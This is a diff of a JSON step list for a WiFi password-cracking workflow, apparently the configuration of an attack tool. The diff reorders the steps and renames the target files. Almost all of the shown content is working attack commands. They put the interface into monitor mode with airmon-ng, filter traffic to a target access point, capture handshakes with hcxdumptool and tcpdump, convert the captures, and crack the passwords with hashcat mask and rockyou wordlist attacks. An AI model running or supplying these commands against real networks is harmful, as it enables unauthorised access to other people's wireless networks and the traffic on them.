@@ -1,12 +1,22 @@
 [
     {
-        "step": 9,
-        "name": "Scan interfaces",
+        "step": 0,
+        "name": "Configure session",
         "commands": [
-            "sudo iw dev",
-            "iwconfig",
-            "sudo airmon-ng",
-            "sudo airmon-ng check kill"
+            "file_path",
+            "session_name",
+            "interface",
+            "macaddress",
+            "channel",
+            "is_2GHz4"
+        ]
+    },
+    {
+        "step": 1,
+        "name": "Restart managing service",
+        "commands": [
+            "sudo systemctl start NetworkManager.service",
+            "sudo systemctl start wpa_supplicant.service"
         ]
     },
     {
@@ -35,39 +45,42 @@
         "step": 5,
         "name": "Create a BPF filter",
         "commands": [
-            "sudo tcpdump -s 65535 -y IEEE802_11_RADIO 'wlan addr3  or wlan addr3 ffffffffffff' -ddd > TestWiFi_attack.bpf"
+            "sudo tcpdump -s 65535 -y IEEE802_11_RADIO 'wlan addr3  or wlan addr3 ffffffffffff' -ddd > NewWiFi_attack.bpf"
         ]
     },
     {
         "step": 6,
         "name": "Start packet capture",
         "commands": [
-            "sudo hcxdumptool -i wlan0 -c 1a --bpf=TestWiFi_attack.bpf -w TestWiFi_capture.pcapng",
-            "sudo tcpdump -U -s 0 -i wlan0 -w TestWiFi_capture.pcap -l -n -e -vv -r TestWiFi_attack.bpf"
+            "sudo hcxdumptool -i wlan0 -c 1a --bpf=NewWiFi_attack.bpf -w NewWiFi_capture.pcapng",
+            "sudo tcpdump -U -s 0 -i wlan0 -w NewWiFi_capture.pcap -l -n -e -vv -r NewWiFi_attack.bpf"
         ]
     },
     {
         "step": 7,
         "name": "Convert captured packets to hashcat format",
         "commands": [
-            "sudo hcxpcaptool -o TestWiFi_hash.hc22000 TestWiFi_capture.pcapngsudo hcxpcaptool -z TestWiFi_hash.16800 TestWiFi_capture.pcapng"
+            "sudo hcxpcaptool -o NewWiFi_hash.hc22000 NewWiFi_capture.pcapng",
+            "sudo hcxpcaptool -z NewWiFi_hash.16800 NewWiFi_capture.pcapng"
         ]
     },
     {
         "step": 8,
         "name": "Crack captured hashes",
         "commands": [
-            "hashcat.exe TestWiFi_hash.hc22000 -a 3 -m 22000 -i --increment-min=8 --increment-max=12 ?d?d?d?d?d?d?d?d?d?d?d?d --session=1",
-            "sudo hashcat -m 22000 TestWiFi_hash.hc22000 %d%d%d%d%d%d%d%d%d%d -a 3 --force",
-            "sudo hashcat -m 16800 TestWiFi_hash.16800 /usr/share/wordlists/rockyou.txt"
+            "hashcat.exe NewWiFi_hash.hc22000 -a 3 -m 22000 -i --increment-min=8 --increment-max=12 ?d?d?d?d?d?d?d?d?d?d?d?d --session=1",
+            "sudo hashcat -m 22000 NewWiFi_hash.hc22000 %d%d%d%d%d%d%d%d%d%d -a 3 --force",
+            "sudo hashcat -m 16800 NewWiFi_hash.16800 /usr/share/wordlists/rockyou.txt"
         ]
     },
     {
-        "step": 1,
-        "name": "Restart managing service",
+        "step": 9,
+        "name": "Scan interfaces",
         "commands": [
-            "sudo systemctl start NetworkManager.service",
-            "sudo systemctl start wpa_supplicant.service"
+            "sudo iw dev",
+            "iwconfig",
+            "sudo airmon-ng",
+            "sudo airmon-ng check kill"
         ]
     },
     {
@@ -84,18 +97,6 @@
             "cd hcxdumptool",
             "sudo make && sudo make install",
             "which hcxdumptool"
-        ]
-    },
-    {
-        "step": 0,
-        "name": "Configure session",
-        "commands": [
-            "file_path",
-            "session_name",
-            "interface",
-            "macaddress",
-            "channel",
-            "is_2GHz4"
         ]
     }
 ]
